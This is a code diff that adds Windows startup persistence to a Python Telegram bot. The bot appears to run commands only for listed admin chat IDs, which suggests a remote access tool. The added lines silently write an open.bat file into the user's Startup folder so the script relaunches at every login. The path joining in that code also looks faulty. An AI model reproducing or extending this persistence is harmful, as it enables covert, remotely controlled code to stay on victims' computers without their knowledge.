@@ -2,8 +2,12 @@ from telebot import TeleBot
 from os import getlogin
 from os.path import dirname, realpath
 from sys import argv
+file_path = dirname(realpath(argv[0]))
+bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getlogin()
+with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+	bat_file.write(r'start "" %s' % file_path + argv[0])
 ADMIN = {}
-bot = TeleBot()
+bot = TeleBot('')
 @bot.message_handler(content_types=['text'])
 def main(message):
 	if message.chat.id in ADMIN.values():
